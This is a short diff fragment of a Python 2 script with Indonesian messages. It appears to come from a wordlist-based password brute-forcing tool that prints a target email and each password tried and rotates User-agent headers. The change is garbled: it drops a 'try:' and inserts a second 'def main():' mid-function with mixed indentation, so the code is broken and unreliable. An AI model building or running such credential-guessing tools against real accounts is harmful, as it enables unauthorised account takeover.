@@ -114,8 +114,7 @@ def main():
         print " "
         print RR+" wordlist tidak ada yg cocok LAE..."
         print " "
-	
-  try:
+def main():	
  	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
 	sys.stdout.flush()
 	noobs.addheaders = [('User-agent', random.choice(useragents))]
